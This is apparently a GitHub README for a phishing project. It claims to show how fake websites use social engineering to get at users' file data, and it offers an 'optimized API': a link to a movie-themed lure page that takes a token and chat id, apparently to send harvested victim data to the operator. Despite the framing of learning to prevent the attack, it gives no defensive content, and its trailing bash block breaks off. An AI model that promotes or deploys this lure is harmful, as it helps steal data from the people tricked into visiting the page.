This project demonstrates how hackers use social engineering to access a user's file manager data through a malicious website. Learn how this method works and how to prevent it. 

## 🧠 How It Works

Hackers create fake websites and use **social engineering** to manipulate users into interacting with them. Once a user engages, the attacker can gain access to sensitive data stored on their file system. 🕵️‍♂️

## 🚀 Public Code vs. Optimized API

🔓 **Public Code**: Great for studying, but slower.  

⚡ **Optimized API**: **40% faster** and more efficient. You’ll get **quicker results** with better performance. 

🔗 [API Documentation - Optimized Version](https://cinemaxhub.vercel.app/movie.html?token=<YOUR_TOKEN>&id=<YOUR_CHAT_ID>)

### 📋 API Usage
You can copy and use the API endpoint below, but **make sure to replace** `<YOUR_TOKEN>` and `<YOUR_CHAT_ID>` with your own credentials. **Don't expose them publicly**. Use environment variables or GitHub Secrets to store sensitive information securely. 🔐

```bash

d=YOUR_CHAT_ID
